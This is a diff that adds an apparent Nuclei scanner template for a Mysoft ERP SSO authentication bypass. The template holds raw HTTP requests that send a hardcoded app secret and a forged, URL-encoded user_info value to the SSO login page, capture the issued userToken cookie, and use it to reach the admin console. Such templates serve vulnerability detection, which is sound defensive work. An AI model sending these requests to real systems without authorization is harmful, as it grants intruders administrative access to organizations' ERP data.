@@ -1,0 +1,53 @@
+id: mysoft-erp-sso-auth-bypass
+info:
+  name: Mysoft ERP SSO Authentication Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: auth-bypass
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /PubPlatform/nav/login/sso/login.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        __yzsAppSecret=testtest&user_info=%66%79%6d%71%35%62%49%63%78%58%5a%49%78%75%36%4b%6c%6c%73%46%49%52%32%5a%77%45%4a%4b%2b%56%45%39%35%44%6b%78%2f%43%6e%46%67%46%51%3d
+    extractors:
+      - type: regex
+        name: usertoken
+        part: header
+        internal: true
+        regex:
+          - "userToken=(.*?);"
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        words:
+          - "userToken="
+        part: header
+
+  - raw:
+      - |
+        GET /PubPlatform/nav/home/default?_nav=0000 HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: userToken={{usertoken}};
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "系统管理"
+          - "组织架构"
+          - "角色管理"
+        part: body
